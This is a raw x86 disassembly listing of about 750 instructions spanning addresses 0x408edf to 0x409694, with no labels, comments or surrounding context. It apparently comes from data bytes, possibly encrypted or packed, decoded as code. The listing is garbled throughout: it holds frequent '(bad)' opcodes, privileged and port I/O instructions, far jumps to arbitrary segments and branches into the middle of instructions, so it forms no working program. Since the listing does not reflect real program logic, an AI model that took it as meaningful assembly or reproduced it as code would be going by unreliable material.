  408edf:	xor    DWORD PTR [ebx-0x65519dd9],0xffffff86
  408ee6:	push   0x4659423e
  408eeb:	mov    edx,0x166686dd
  408ef0:	push   esi
  408ef1:	mov    al,ds:0xf246686b
  408ef6:	add    BYTE PTR [ecx],ah
  408ef8:	mov    ch,0xa5
  408efa:	jecxz  0x408f72
  408efc:	and    ebp,DWORD PTR [ecx-0x55]
  408eff:	mov    ecx,0x386d78d9
  408f04:	xchg   edi,eax
  408f05:	lds    ebx,FWORD PTR [eax-0x11]
  408f08:	iret   
  408f09:	fdiv   DWORD PTR [edi+0x13]
  408f0c:	cld    
  408f0d:	add    BYTE PTR [edi-0x3dbe2dde],dl
  408f13:	nop
  408f14:	or     bh,cl
  408f16:	jmp    0xcebac822
  408f1b:	pop    ss
  408f1c:	sub    DWORD PTR [ecx-0x6e],edi
  408f1f:	adc    al,0x6f
  408f21:	pusha  
  408f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f23:	adc    eax,0xe923a2b7
  408f28:	aam    0x41
  408f2a:	add    edi,DWORD PTR [edi]
  408f2c:	(bad)  
  408f2d:	mov    esp,0x9cda69fb
  408f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f33:	daa    
  408f34:	pushf  
  408f35:	fwait
  408f36:	cmp    al,0xac
  408f38:	shl    BYTE PTR [edx-0x15037282],cl
  408f3e:	aas    
  408f3f:	sti    
  408f40:	faddp  st(0),st
  408f42:	rol    cl,cl
  408f44:	and    edi,DWORD PTR [ebx]
  408f46:	repz jns 0x408fb0
  408f49:	pop    ss
  408f4a:	jo     0x408ecc
  408f4c:	cmp    BYTE PTR [ecx+edx*4],bh
  408f4f:	jle    0x408f03
  408f51:	ja     0x408f94
  408f53:	fisub  WORD PTR [esi-0x23be4a44]
  408f59:	outs   dx,BYTE PTR ds:[esi]
  408f5a:	pop    dx
  408f5c:	popf   
  408f5d:	mov    al,ds:0x712b3740
  408f62:	pop    edi
  408f63:	mov    ebx,0xac6ea617
  408f68:	sbb    DWORD PTR [edx],edi
  408f6a:	icebp  
  408f6b:	pop    es
  408f6c:	jne    0x408fe8
  408f6e:	les    esp,FWORD PTR [eax+0x6969428a]
  408f74:	test   BYTE PTR [eax],ch
  408f76:	out    0xe2,eax
  408f78:	jge    0x408ff6
  408f7a:	ror    DWORD PTR [ecx-0x5795dc7d],cl
  408f80:	mov    dh,0x3b
  408f82:	pop    eax
  408f83:	jb     0x408fee
  408f85:	aaa    
  408f86:	cdq    
  408f87:	rcl    edx,cl
  408f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f8b:	sub    BYTE PTR [esi+0x5ddfacb6],0xac
  408f92:	sti    
  408f93:	xchg   edx,eax
  408f94:	clc    
  408f95:	xchg   BYTE PTR [esi+edi*8+0x1b],ch
  408f99:	xchg   DWORD PTR [ecx],ebx
  408f9b:	mov    bl,0xc7
  408f9d:	sbb    BYTE PTR [esi+eax*8+0x155af106],al
  408fa4:	ins    BYTE PTR es:[edi],dx
  408fa5:	and    al,0xb3
  408fa7:	dec    ebx
  408fa8:	sub    al,BYTE PTR [esi]
  408faa:	cmp    BYTE PTR [ecx-0x137dc318],dl
  408fb0:	xor    al,0x36
  408fb2:	enter  0x3e71,0x68
  408fb6:	scas   al,BYTE PTR es:[edi]
  408fb7:	adc    DWORD PTR [edi],eax
  408fb9:	xor    eax,0x3959e7bf
  408fbe:	dec    edx
  408fbf:	je     0x408f78
  408fc1:	stos   BYTE PTR es:[edi],al
  408fc2:	xchg   ebp,edx
  408fc4:	sub    BYTE PTR [edx],bh
  408fc6:	xchg   esi,eax
  408fc7:	rcl    BYTE PTR [eax+0xc],cl
  408fca:	test   ah,0x70
  408fcd:	enter  0x37a6,0x87
  408fd1:	jne    0x408ff3
  408fd3:	mov    WORD PTR [edx],?
  408fd5:	pusha  
  408fd6:	aad    0xa2
  408fd8:	outs   dx,DWORD PTR ds:[esi]
  408fd9:	rcl    ecx,0xf3
  408fdc:	push   edi
  408fdd:	push   ss
  408fde:	sub    esi,ebx
  408fe0:	call   0x4a8:0x92ba8276
  408fe7:	dec    edi
  408fe8:	inc    eax
  408fe9:	ror    BYTE PTR [edi-0x5b],cl
  408fec:	fsub   QWORD PTR [edi-0x690854cb]
  408ff2:	pop    edi
  408ff3:	mov    eax,0x2c245d0f
  408ff8:	daa    
  408ff9:	push   eax
  408ffa:	fnstenv [ebx]
  408ffc:	es xchg edx,eax
  408ffe:	clc    
  408fff:	mov    BYTE PTR [edi+0x4d4b5117],ch
  409005:	sbb    al,0x9a
  409007:	cmp    eax,0xd18ed05d
  40900c:	add    ecx,DWORD PTR [ecx+0x6d43cb4d]
  409012:	std    
  409013:	adc    al,0xe3
  409016:	mov    eax,0x8d313027
  40901c:	pusha  
  40901d:	cld    
  40901e:	mov    edx,0xdaad9825
  409023:	std    
  409024:	pop    edx
  409025:	std    
  409026:	gs jae 0x408fcb
  409029:	dec    esi
  40902a:	cmp    ah,BYTE PTR [esi]
  40902c:	(bad)  
  40902d:	ins    BYTE PTR es:[edi],dx
  40902e:	aaa    
  40902f:	and    BYTE PTR [eax],ch
  409031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409032:	aad    0x10
  409034:	cmp    ebp,DWORD PTR [edi+ebx*2]
  409037:	push   ebp
  409038:	pushf  
  409039:	popf   
  40903a:	fdivr  DWORD PTR [esi]
  40903c:	mov    esi,0x221a763b
  409041:	jno    0x4090b2
  409043:	or     DWORD PTR [eax],0xbde1ff2a
  409049:	cwde   
  40904a:	xchg   esp,eax
  40904b:	sbb    eax,0x23a0b427
  409050:	ret    
  409051:	inc    ebx
  409052:	fidivr WORD PTR [edx]
  409054:	dec    edi
  409055:	maskmovq mm1,(bad)
  409056:	test   DWORD PTR [edx],0xdfc0d295
  40905c:	ret    0x9c77
  40905f:	or     al,0x5c
  409061:	stos   DWORD PTR es:[edi],eax
  409062:	mov    ebx,0x1d22da02
  409067:	repnz pop ecx
  409069:	mov    BYTE PTR [edx+0x7c3b881],ch
  40906f:	retf   0x2d54
  409072:	lahf   
  409073:	dec    ebx
  409074:	pop    ss
  409075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409076:	mov    gs,WORD PTR [esi+0x4c]
  409079:	mov    edi,0xc65d42c3
  40907e:	mov    ds:0x23fbcc94,eax
  409083:	cmp    al,0x64
  409085:	pop    edi
  409086:	xor    DWORD PTR [esi],0x45c1ea8d
  40908c:	lods   eax,DWORD PTR ds:[esi]
  40908d:	mov    ch,0xb
  40908f:	les    edx,FWORD PTR [edx+0x2f]
  409092:	sub    eax,0x206fd9b9
  409097:	push   ds
  409098:	(bad)  [esi]
  40909a:	fwait
  40909b:	dec    esi
  40909c:	loopne 0x409068
  40909e:	dec    esp
  40909f:	loop   0x4090f7
  4090a1:	sbb    edx,DWORD PTR [esp+edi*2-0xa4dabac]
  4090a8:	xor    edi,DWORD PTR [edx-0x6ec5d6fd]
  4090ae:	pop    edi
  4090af:	fwait
  4090b0:	jmp    0xfbe4d8c5
  4090b5:	sbb    ah,cl
  4090b7:	pop    ss
  4090b8:	pop    edi
  4090b9:	add    DWORD PTR [edi+0x28e01aff],edi
  4090bf:	jmp    0x409117
  4090c1:	call   0xdbbf826f
  4090c6:	fistp  WORD PTR [edx+0x506dd855]
  4090cc:	xchg   edx,eax
  4090cd:	inc    ebp
  4090ce:	div    BYTE PTR [edx+esi*1+0x350577c3]
  4090d5:	and    al,0xc6
  4090d7:	pop    ss
  4090d8:	adc    ebx,DWORD PTR [ecx-0x6f2367af]
  4090de:	mov    ecx,cs
  4090e0:	fist   DWORD PTR [eax-0x33]
  4090e3:	and    ch,0xd4
  4090e6:	inc    edi
  4090e7:	loop   0x4090df
  4090e9:	adc    al,0xba
  4090eb:	sbb    DWORD PTR [edx+0x27],0xad422f5f
  4090f2:	jecxz  0x4090bc
  4090f4:	jb     0x4090bc
  4090f6:	leave  
  4090f7:	clc    
  4090f8:	setb   cl
  4090fb:	repz rcl DWORD PTR [edi+0x6],1
  4090ff:	ins    BYTE PTR es:[edi],dx
  409100:	jae    0x409166
  409102:	mov    ds:0xf016c1aa,al
  409107:	mov    BYTE PTR [eax+0x4b7662e6],0x15
  40910e:	fist   WORD PTR [esi-0x3b]
  409111:	push   ebp
  409112:	and    DWORD PTR [esi],eax
  409114:	into   
  409115:	mov    dl,BYTE PTR [ebx]
  409117:	push   ecx
  409118:	jmp    0x4da2:0xef7633b3
  40911f:	sbb    DWORD PTR [esi+0x63585cd9],eax
  409125:	mov    esi,0xf94cbbe6
  40912a:	repz dec ebx
  40912c:	ins    BYTE PTR es:[edi],dx
  40912d:	fisub  DWORD PTR [edi*8+0x6eb6d4d]
  409134:	jmp    0x40911e
  409136:	mov    ecx,0x7f38cec8
  40913b:	jae    0x40916a
  40913d:	inc    ecx
  40913e:	sub    DWORD PTR [esi+0x4e03e219],ebx
  409144:	add    edi,DWORD PTR [ebx+0x63ddd35e]
  40914a:	rcr    BYTE PTR [esi+0x6c4c116],0x6a
  409151:	(bad)  
  409152:	mov    ecx,0xc634aafc
  409157:	lock push esi
  409159:	fisub  WORD PTR [ebp-0x60]
  40915c:	test   BYTE PTR [eax+eax*2+0x16],0x2d
  409161:	xchg   edi,eax
  409162:	sub    eax,0xfd044d9a
  409168:	jae    0x409131
  40916a:	xchg   ebx,eax
  40916b:	fiadd  WORD PTR [esi-0x21ab996d]
  409171:	push   ebx
  409172:	xor    BYTE PTR [ecx-0x7765eaf7],dh
  409178:	loopne 0x40913b
  40917a:	xor    dl,BYTE PTR [ecx+0x6bf77e03]
  409180:	dec    ebx
  409181:	(bad)  
  409182:	scas   al,BYTE PTR es:[edi]
  409183:	push   esi
  409184:	and    al,0xfc
  409186:	in     al,dx
  409187:	retf   
  409188:	cwde   
  409189:	iret   
  40918a:	lea    ebx,[edi-0x3ba001a]
  409190:	jg     0x409164
  409192:	xor    esp,esi
  409194:	sbb    BYTE PTR [esi-0x7f6a5f24],bl
  40919a:	jmp    0x4d1:0x73b45480
  4091a1:	pop    es
  4091a2:	inc    esp
  4091a3:	je     0x4091c0
  4091a5:	xchg   ch,bl
  4091a7:	cmp    DWORD PTR [ebx-0x6d],ebp
  4091aa:	retf   0x51e3
  4091ad:	mov    cl,BYTE PTR [edi-0x37]
  4091b0:	dec    esi
  4091b1:	enter  0x82c2,0xec
  4091b5:	jnp    0x409197
  4091b7:	cld    
  4091b8:	les    ebp,FWORD PTR [edi+ebp*2+0x747383e5]
  4091bf:	jo     0x40918e
  4091c1:	or     dl,ah
  4091c3:	ds xchg edi,eax
  4091c5:	fnstcw WORD PTR [edx-0x2eaac88]
  4091cb:	pop    ds
  4091cc:	sbb    BYTE PTR [edi+eiz*2-0xa],ch
  4091d0:	stos   BYTE PTR es:[edi],al
  4091d1:	add    DWORD PTR [ebx],edi
  4091d3:	lods   al,BYTE PTR ds:[esi]
  4091d4:	and    BYTE PTR [eax+0x6dcf59e6],dh
  4091da:	cld    
  4091db:	jno    0x4091fe
  4091dd:	push   ebp
  4091de:	jle    0x409186
  4091e0:	shl    BYTE PTR [ecx+0x57c11efa],0x50
  4091e7:	in     eax,dx
  4091e8:	iret   
  4091e9:	sub    ch,BYTE PTR [edi*4+0x1e71906d]
  4091f0:	loope  0x4091b5
  4091f2:	mov    ebx,0x5f1d3ad2
  4091f7:	mov    sp,0xd4b9
  4091fb:	fisubr WORD PTR [edi+eiz*1-0x59]
  4091ff:	adc    eax,0x75359916
  409204:	sbb    ebp,DWORD PTR [edi+0x42]
  409207:	inc    ebp
  409208:	push   edi
  409209:	nop
  40920a:	daa    
  40920b:	xor    al,0x75
  40920d:	(bad)  
  40920f:	pop    ebx
  409210:	and    eax,0xc53a752e
  409215:	jl     0x40924e
  409217:	pop    esi
  409218:	cdq    
  409219:	xor    al,bh
  40921b:	pop    ecx
  40921c:	stc    
  40921d:	bound  esp,QWORD PTR [edx+0x21]
  409220:	mov    edx,0x6aad5463
  409225:	iret   
  409226:	clc    
  409227:	mov    ch,0xcc
  409229:	pop    edi
  40922a:	shl    bl,cl
  40922c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40922d:	daa    
  40922e:	sub    al,BYTE PTR [ebx]
  409230:	push   ebp
  409231:	mov    ecx,DWORD PTR [edi+0x6d772c2b]
  409237:	aam    0xbd
  409239:	sub    BYTE PTR [edi],dl
  40923b:	cmp    eax,0x14a996fc
  409240:	retf   0x2927
  409243:	fild   QWORD PTR [edi+0x48ffb204]
  409249:	push   0xbae7e4c2
  40924e:	in     al,dx
  40924f:	fdiv   st,st(6)
  409251:	sar    BYTE PTR [esi],1
  409253:	js     0x4091ed
  409255:	jb     0x4092b9
  409257:	test   al,0xdb
  409259:	cmp    al,0x74
  40925b:	cmc    
  40925c:	popf   
  40925d:	mov    ch,bl
  40925f:	jg     0x409200
  409261:	int    0x47
  409263:	and    edi,DWORD PTR [ecx]
  409265:	inc    eax
  409266:	mov    cl,0xd2
  409268:	stos   DWORD PTR es:[edi],eax
  409269:	ret    
  40926a:	mov    bl,0xab
  40926c:	adc    DWORD PTR [ecx+0x50],ecx
  40926f:	xor    al,0x5f
  409271:	cwde   
  409272:	rdtsc  
  409274:	shl    BYTE PTR [esi],cl
  409276:	test   DWORD PTR [edi],edx
  409278:	outs   dx,DWORD PTR ds:[esi]
  409279:	bound  esi,QWORD PTR [ecx+ebp*4-0x472dcfde]
  409280:	scas   eax,DWORD PTR es:[edi]
  409281:	adc    DWORD PTR [ebx+0x7cc97210],0x59
  409288:	jae    0x409303
  40928a:	push   0x4b
  40928c:	rol    DWORD PTR [esi],0x1b
  40928f:	int3   
  409290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409291:	pop    edi
  409292:	loope  0x409308
  409294:	jmp    0x4092e2
  409296:	lock es retf 0x4630
  40929b:	nop
  40929c:	xchg   ebx,eax
  40929d:	cmp    al,0xed
  40929f:	stos   BYTE PTR es:[edi],al
  4092a0:	adc    dh,BYTE PTR [ebp-0x25]
  4092a3:	jl     0x409240
  4092a5:	jns    0x4092d3
  4092a7:	out    dx,al
  4092a8:	mov    eax,ds:0xae5df6f1
  4092ad:	mov    ds:0x1ca1808d,al
  4092b2:	in     al,dx
  4092b3:	scas   eax,DWORD PTR es:[edi]
  4092b4:	ins    DWORD PTR es:[edi],dx
  4092b5:	xchg   edi,eax
  4092b6:	dec    edx
  4092b7:	push   ss
  4092b8:	inc    ecx
  4092b9:	add    edx,DWORD PTR [ebx-0x4b890a65]
  4092bf:	cld    
  4092c0:	xor    ah,BYTE PTR [edx+ebp*1-0x1]
  4092c4:	jl     0x4092e7
  4092c6:	mov    ebp,0xd2380e26
  4092cb:	js     0x409321
  4092cd:	ins    DWORD PTR es:[edi],dx
  4092ce:	and    al,0x2e
  4092d0:	fimul  DWORD PTR [edx+0x2c23bf87]
  4092d6:	ror    DWORD PTR [esi-0xe],cl
  4092d9:	push   ss
  4092da:	adc    ebp,DWORD PTR [ebx]
  4092dc:	jecxz  0x4092b3
  4092de:	ror    BYTE PTR [esp+ecx*1-0x4ed736d5],0x75
  4092e6:	pop    esi
  4092e7:	pop    ds
  4092e8:	int    0x5a
  4092ea:	push   edx
  4092eb:	stc    
  4092ec:	js     0x4092ab
  4092ee:	xchg   edx,eax
  4092ef:	lahf   
  4092f0:	fwait
  4092f1:	cli    
  4092f2:	rcr    BYTE PTR [esp+edx*2+0x3e8e96f0],cl
  4092f9:	xchg   ebx,eax
  4092fa:	jbe    0x409355
  4092fc:	out    dx,al
  4092fd:	dec    eax
  4092fe:	sar    BYTE PTR [esi+0x57396a33],1
  409304:	aaa    
  409305:	xchg   ebx,eax
  409306:	lea    ebx,[ebx]
  409308:	popf   
  409309:	call   0x18b8664d
  40930e:	(bad)  
  40930f:	cmp    ebp,esi
  409311:	or     ebx,eax
  409313:	aaa    
  409314:	(bad)  
  409315:	aas    
  409316:	adc    eax,0x10855093
  40931b:	jg     0x4092a6
  40931d:	sub    al,0x60
  40931f:	(bad)  
  409320:	imul   ecx,edi,0x3a8962e1
  409326:	les    ebp,FWORD PTR [ebx+0x7b]
  409329:	jae    0x4092e4
  40932b:	inc    edx
  40932c:	repnz neg DWORD PTR [ebx]
  40932f:	sbb    DWORD PTR [eax],edi
  409331:	jmp    0xbd779893
  409336:	jns    0x40937e
  409338:	cmp    eax,0x1f41179b
  40933d:	add    ch,ch
  40933f:	and    DWORD PTR [ebx-0x6e6b0ee6],esi
  409345:	jnp    0x409305
  409347:	out    0x6c,eax
  409349:	loope  0x4092fe
  40934b:	push   eax
  40934c:	pop    eax
  40934d:	in     eax,dx
  40934e:	fimul  WORD PTR [eax+0x1f]
  409351:	xor    cl,ch
  409353:	fcmovnu st,st(1)
  409355:	arpl   WORD PTR [edi],dx
  409357:	mov    edi,0x9956efe7
  40935c:	mov    edx,0xc5865b91
  409361:	mov    al,ds:0x39631f
  409366:	dec    ecx
  409367:	pop    ebx
  409368:	mov    BYTE PTR [ecx+ebx*2],dl
  40936b:	outs   dx,DWORD PTR ds:[esi]
  40936c:	dec    edi
  40936d:	or     BYTE PTR [eax+0x1be99bf2],ch
  409373:	mov    ds:0xf84fd7e3,al
  409378:	jns    0x4093bd
  40937a:	mov    BYTE PTR [esi+ecx*8-0x15b52dbf],bl
  409381:	fcomp  st(3)
  409383:	and    DWORD PTR [esi+0x79],ebp
  409386:	mov    BYTE PTR [eax],dh
  409388:	(bad)  
  409389:	and    cl,cl
  40938b:	fistp  WORD PTR [esi]
  40938d:	or     BYTE PTR [ecx+0x12],dl
  409390:	fs loopne 0x40940a
  409393:	jne    0x4093f5
  409395:	dec    edi
  409396:	loopne 0x4093f1
  409398:	dec    ebx
  409399:	je     0x4093a4
  40939b:	lods   al,BYTE PTR ds:[esi]
  40939c:	push   0x25
  40939e:	inc    esp
  40939f:	push   esp
  4093a0:	push   0xffffffdb
  4093a2:	je     0x4093e5
  4093a4:	neg    BYTE PTR [ecx]
  4093a6:	jnp    0x4093f3
  4093a8:	jne    0x4093bc
  4093aa:	cld    
  4093ab:	mov    esi,0x184b68bf
  4093b0:	pop    esi
  4093b1:	sub    ch,al
  4093b3:	jmp    0x409402
  4093b5:	jno    0x4093b4
  4093b7:	shl    esi,cl
  4093b9:	jecxz  0x4093a0
  4093bb:	cmp    DWORD PTR [esi],edi
  4093bd:	gs stos DWORD PTR es:[edi],eax
  4093bf:	mov    BYTE PTR [ecx+0x5b71e57b],bl
  4093c5:	xchg   ebx,eax
  4093c6:	inc    edi
  4093c7:	shl    DWORD PTR [ebx+ebp*4],0xab
  4093cb:	fisttp WORD PTR [ecx+0x2e44165a]
  4093d1:	cmp    DWORD PTR [edx+0x5],esp
  4093d4:	sub    eax,0xfcc1ec03
  4093d9:	mov    ebx,0x918e72e4
  4093df:	scas   al,BYTE PTR es:[edi]
  4093e0:	xchg   ecx,eax
  4093e1:	mov    eax,ds:0xc1d79db8
  4093e6:	gs jmp 0x409465
  4093e9:	dec    ebp
  4093ea:	jno    0x409452
  4093ec:	dec    edx
  4093ed:	dec    edx
  4093ee:	inc    ebx
  4093ef:	adc    BYTE PTR [edx+0x43],ah
  4093f2:	cmp    eax,0x712a805b
  4093f7:	daa    
  4093f8:	sub    bh,BYTE PTR [esi+ebx*8-0x3d]
  4093fc:	sbb    DWORD PTR [ecx],edi
  4093fe:	push   ebx
  4093ff:	pop    eax
  409400:	add    DWORD PTR [ebx+0x57],edi
  409403:	xor    edx,esp
  409405:	or     al,0xc9
  409407:	fsubr  DWORD PTR [ecx+0x12]
  40940a:	add    DWORD PTR [ebx-0x17e47d5e],edx
  409410:	(bad)  
  409411:	aam    0xd4
  409413:	test   al,0x3b
  409415:	push   edi
  409416:	hlt    
  409417:	sbb    edi,DWORD PTR [edx+0x41fb8836]
  40941d:	out    dx,al
  40941e:	xrelease xacquire xchg DWORD PTR [eax-0x76857937],esp
  409426:	ret    0xa7de
  409429:	jge    0x40941b
  40942b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40942c:	push   ebp
  40942d:	gs jb  0x409471
  409430:	clc    
  409431:	and    DWORD PTR [ebp-0x15f4013a],0x1
  409438:	xlat   BYTE PTR ds:[ebx]
  409439:	jne    0x90e7845f
  40943f:	inc    ebx
  409440:	test   bl,dl
  409442:	add    BYTE PTR [edx+0x58],0x36
  409446:	push   ebx
  409447:	xchg   ebp,eax
  409448:	mov    ebp,DWORD PTR [eax]
  40944a:	aad    0xa7
  40944c:	out    0xe5,al
  40944e:	cmp    dh,BYTE PTR [ecx]
  409450:	jno    0x409414
  409452:	jmp    0x409417
  409454:	push   ebp
  409455:	or     esi,edi
  409457:	pushf  
  409458:	jmp    0x40945b
  40945a:	(bad)  
  40945b:	stos   DWORD PTR es:[edi],eax
  40945c:	add    ebx,DWORD PTR [ebx+0x52]
  40945f:	daa    
  409460:	lds    ebp,FWORD PTR [edx+0x16]
  409463:	and    al,BYTE PTR [eax-0x7c620265]
  409469:	or     ecx,DWORD PTR [eax-0x5a]
  40946c:	je     0x4094ea
  40946e:	add    BYTE PTR [ebx+0x20],cl
  409471:	lods   al,BYTE PTR ds:[esi]
  409472:	adc    edx,DWORD PTR [ebx-0x76]
  409475:	ror    ebx,0x62
  409478:	sbb    eax,0x6fd28364
  40947d:	cld    
  40947e:	out    0x3b,eax
  409480:	mov    dh,0x3c
  409482:	xchg   edi,eax
  409483:	repz (bad) 
  409485:	jge    0x409456
  409487:	or     DWORD PTR [ebp-0xa],0x5d5dcc29
  40948e:	mov    esi,0xd5774d44
  409493:	ret    0x96d1
  409496:	xor    eax,0xe14e08f1
  40949b:	pushf  
  40949c:	inc    ecx
  40949d:	xor    al,ah
  40949f:	shr    DWORD PTR [edx],0xb8
  4094a2:	xor    al,0xce
  4094a4:	cld    
  4094a5:	inc    edx
  4094a6:	pop    edx
  4094a7:	in     eax,dx
  4094a8:	scas   al,BYTE PTR es:[edi]
  4094a9:	push   edi
  4094aa:	cli    
  4094ab:	aad    0xed
  4094ad:	test   eax,0x7885b560
  4094b2:	int    0x9c
  4094b4:	dec    BYTE PTR [ebx+0x14]
  4094b7:	pusha  
  4094b8:	pop    ss
  4094b9:	and    BYTE PTR [ebp+0x4c],ch
  4094bc:	rol    BYTE PTR [ebx-0x72],0xf5
  4094c0:	xchg   BYTE PTR [ecx-0x5f574ec6],ah
  4094c6:	ret    
  4094c7:	test   al,0xb0
  4094c9:	mov    BYTE PTR [edi],0x73
  4094cc:	in     eax,dx
  4094cd:	popa   
  4094ce:	and    esi,esi
  4094d0:	push   0x11
  4094d2:	mov    ebp,DWORD PTR [ebp-0xe]
  4094d5:	sub    eax,edx
  4094d7:	sub    al,0x99
  4094d9:	sahf   
  4094da:	mov    dl,0xaf
  4094dc:	lods   al,BYTE PTR ds:[esi]
  4094dd:	das    
  4094de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094df:	(bad)  
  4094e0:	in     al,dx
  4094e1:	push   es
  4094e2:	(bad)  
  4094e3:	in     al,0xa7
  4094e5:	mov    ebx,0x4879d27d
  4094ea:	pop    es
  4094eb:	leave  
  4094ec:	jb     0x4094ed
  4094ee:	push   esp
  4094ef:	test   eax,0xa4da8235
  4094f4:	mov    ds:0x7b1c479e,eax
  4094f9:	lock xor al,0xb4
  4094fc:	adc    ecx,DWORD PTR [esi-0x1998cb32]
  409502:	xor    eax,0x13ef7420
  409507:	lods   eax,DWORD PTR ds:[esi]
  409508:	cli    
  409509:	mov    al,0xc6
  40950b:	mov    bh,0xa1
  40950d:	mov    ds:0x9fd0a825,al
  409512:	sbb    ecx,eax
  409514:	xchg   DWORD PTR [edi+0x7e],ecx
  409517:	loopne 0x4094aa
  409519:	fadd   QWORD PTR [edi]
  40951b:	and    eax,0x9b97879f
  409520:	inc    esp
  409521:	loope  0x409568
  409523:	repz jmp 0x409589
  409526:	retf   
  409527:	cmp    BYTE PTR [eax+esi*8+0x2f],dh
  40952b:	bound  ebp,QWORD PTR [esi]
  40952d:	mov    ds:0x19cbbb0d,eax
  409532:	sbb    esp,DWORD PTR [edx-0x3e]
  409535:	jle    0x409527
  409537:	or     eax,0x4c4d2a31
  40953c:	adc    edx,DWORD PTR [ebx]
  40953e:	and    al,0x27
  409540:	imul   ebx,DWORD PTR [ebp-0x3416504d],0xfffffff0
  409547:	dec    esp
  409548:	ror    DWORD PTR [ebx-0x2adc89d1],cl
  40954e:	sbb    al,0x8b
  409550:	(bad)  
  409551:	mov    eax,ds:0xe98767fe
  409556:	jle    0x4095a5
  409558:	not    DWORD PTR [edi]
  40955a:	inc    esp
  40955b:	xchg   ecx,eax
  40955c:	and    eax,ebx
  40955e:	jge    0x4094e1
  409560:	test   eax,0x2628f1d9
  409565:	std    
  409566:	ret    0x81e1
  409569:	inc    edi
  40956a:	lods   al,BYTE PTR ds:[esi]
  40956b:	cmp    dl,BYTE PTR [esi]
  40956d:	sub    DWORD PTR [ebx-0x3d323994],esi
  409573:	gs cli 
  409575:	(bad)  
  409576:	mov    ah,0x8a
  409578:	(bad)  
  409579:	push   ecx
  40957a:	xchg   esp,eax
  40957b:	and    al,0xbe
  40957d:	out    dx,al
  40957e:	pop    ss
  40957f:	aam    0x47
  409581:	(bad)  
  409582:	pop    ss
  409583:	in     al,0xf9
  409585:	cmp    al,0xe5
  409587:	lods   eax,DWORD PTR ds:[esi]
  409588:	mov    ecx,0x87f35b48
  40958d:	mov    ds:0xa2ef9f5d,eax
  409592:	imul   ecx,edi,0x6cef0c76
  409598:	push   esi
  409599:	pop    eax
  40959a:	push   eax
  40959b:	fwait
  40959c:	cmp    edx,DWORD PTR [ebx-0x42bbc02d]
  4095a2:	js     0x40956b
  4095a4:	and    esi,DWORD PTR [edi+0x1f82f574]
  4095aa:	sub    al,0x89
  4095ac:	inc    eax
  4095ad:	ja     0x40956d
  4095af:	fadd   DWORD PTR [ebx+eax*8]
  4095b2:	mov    ah,ch
  4095b4:	push   0x1f
  4095b6:	mov    ds:0xf8b8a0ca,eax
  4095bb:	aaa    
  4095bc:	pop    edi
  4095bd:	out    0x7,eax
  4095bf:	sar    BYTE PTR [eax],1
  4095c1:	pop    sp
  4095c3:	fisub  DWORD PTR [eax]
  4095c5:	repnz rol BYTE PTR [edi],0x7d
  4095c9:	lock aad 0x31
  4095cc:	(bad)  
  4095cd:	and    DWORD PTR [ebx-0x245548e4],edx
  4095d3:	retf   
  4095d4:	retf   0x9e1f
  4095d7:	lock popa 
  4095d9:	jmp    0x941b:0x7c5b825c
  4095e0:	cmp    al,0x1c
  4095e2:	add    dh,BYTE PTR [esp+ecx*2+0x3b]
  4095e6:	popf   
  4095e7:	loope  0x409655
  4095e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095ea:	jmp    0x71e63ca5
  4095ef:	inc    ecx
  4095f0:	add    al,0x4f
  4095f2:	pop    edx
  4095f3:	add    ecx,ecx
  4095f5:	add    edi,DWORD PTR [esi+0x64e1ed07]
  4095fb:	cli    
  4095fc:	lock push cs
  4095fe:	(bad)  
  4095ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409600:	pop    eax
  409601:	adc    BYTE PTR [esi],bh
  409603:	xor    BYTE PTR [ebp-0x6a08a588],cl
  409609:	pushf  
  40960a:	mov    bl,0x92
  40960c:	sub    eax,eax
  40960e:	sub    cl,BYTE PTR [eax+0x56]
  409611:	fldcw  WORD PTR [ebp+ebp*4-0x25fd0ab]
  409618:	adc    dh,BYTE PTR [ebx-0x6fcffc01]
  40961e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40961f:	(bad)  
  409620:	icebp  
  409621:	gs push edx
  409623:	(bad)  
  409624:	nop
  409625:	outs   dx,BYTE PTR ds:[esi]
  409626:	jmp    0x58f33479
  40962b:	add    DWORD PTR [esi-0x2b],eax
  40962e:	cmc    
  40962f:	push   ds
  409630:	dec    edx
  409631:	mov    bl,0x8
  409633:	add    ah,al
  409635:	mov    fs,ecx
  409637:	popa   
  409638:	arpl   WORD PTR [esi-0x76],di
  40963b:	mov    edi,0x3c53c1b4
  409640:	push   ds
  409641:	xor    esi,eax
  409643:	shr    al,cl
  409645:	test   DWORD PTR [edi+0x4],ecx
  409648:	sbb    al,0x91
  40964a:	(bad)  
  40964b:	fwait
  40964c:	jne    0x40961f
  40964e:	sbb    dh,BYTE PTR [eax]
  409650:	push   esi
  409651:	pusha  
  409652:	repz aas 
  409654:	xchg   edi,eax
  409655:	lahf   
  409656:	push   ecx
  409657:	(bad)  
  409658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409659:	pop    ss
  40965a:	jmp    0xcc54cfc4
  40965f:	out    0x42,al
  409661:	xor    bl,BYTE PTR [ebx+ebx*8-0x4f]
  409665:	jmp    0x509b:0xb7cf59d0
  40966c:	push   ds
  40966d:	repz ret 
  40966f:	xor    ah,BYTE PTR [edx-0x114e1b42]
  409675:	dec    ebp
  409676:	or     BYTE PTR [eax+0x2],cl
  409679:	pusha  
  40967a:	push   gs
  40967c:	inc    ebx
  40967d:	mov    al,0x86
  40967f:	sub    ch,BYTE PTR ds:0x811477af
  409685:	in     eax,dx
  409686:	ror    DWORD PTR [eax],1
  409688:	stos   BYTE PTR es:[edi],al
  409689:	jecxz  0x409680
  40968b:	sub    DWORD PTR [eax-0x55],edx
  40968e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40968f:	in     eax,dx
  409690:	pop    esi
  409691:	add    esi,DWORD PTR [eax]
  409693:	hlt    
  409694:	stos   BYTE PTR es:[edi],al
